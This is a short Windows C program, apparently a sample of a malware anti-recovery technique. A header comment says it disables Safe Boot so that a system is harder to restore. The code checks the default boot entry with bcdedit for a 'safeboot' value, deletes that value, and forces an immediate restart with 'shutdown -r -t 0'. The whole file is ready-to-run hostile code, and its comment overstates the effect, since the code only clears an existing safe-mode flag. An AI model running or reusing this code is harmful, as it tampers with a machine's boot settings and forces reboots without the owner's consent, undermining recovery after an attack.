#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
//uses the Windows utility bcdedit.exe to disable Safe Boot, a recovery mechanism that could otherwise help restore a system.
int is_safe_mode_enabled() {
    FILE *fp;
    char buffer[512];

    // Run the bcdedit command and capture the output
    fp = _popen("bcdedit /enum {default}", "r");
    if (fp == NULL) {
        return 0; // Assume Safe Mode not enabled if command fails
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        // Look for the "safeboot" entry in BCD output
        if (strstr(buffer, "safeboot") != NULL) {
            _pclose(fp);
            return 1; // Safe Mode is enabled
        }
    }

    _pclose(fp);
    return 0; // Safe Mode not enabled
}

int main() {
    if (is_safe_mode_enabled()) {
        // Remove safeboot setting from BCD
        system("bcdedit /deletevalue {default} safeboot");
        
        // Reboot the system immediately
        system("shutdown -r -t 0");
    } else {
        printf("Safe Mode is not enabled. No action taken.\n");
    }

    return 0;
}
